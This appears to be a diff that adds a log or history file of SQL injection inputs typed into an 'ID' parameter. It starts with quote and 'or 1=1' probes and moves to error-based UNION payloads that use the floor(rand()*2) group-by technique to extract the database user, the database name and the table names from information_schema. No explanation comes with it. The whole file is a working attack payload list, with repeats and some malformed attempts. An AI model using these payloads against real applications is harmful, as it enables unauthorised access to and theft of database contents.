@@ -1,0 +1,39 @@
+ID:(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))#
+ID:(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))#
+ID:(select count(column_name),2,3 from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))#
+ID:(select count(column_name),2,3 from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))#
+ID:(select count(column_name),2,3 from information_schema.columns group by concat(0x3a,0x3a,(select user(),2,3),0x3a,0x3a,floor(rand()*2)))#
+ID:1
+ID:'
+ID:'-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:0' union select 1,2,database()-- -
+ID:0' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:0' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:0' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:0' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:0
+ID:0
+ID:'
+ID:"
+ID:')
+ID:'
+ID:1
+ID:0' or 1=1-- -
+ID:0'
+ID:0'-- -
+ID:0' or length(database())=8-- -
+ID:'
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:1
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select 1,2,3),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select 1),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select group_concat(table_name from information_schema.tables where table_schema=database())),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+ID:4' union select 1,count(*), concat(0x3a,0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
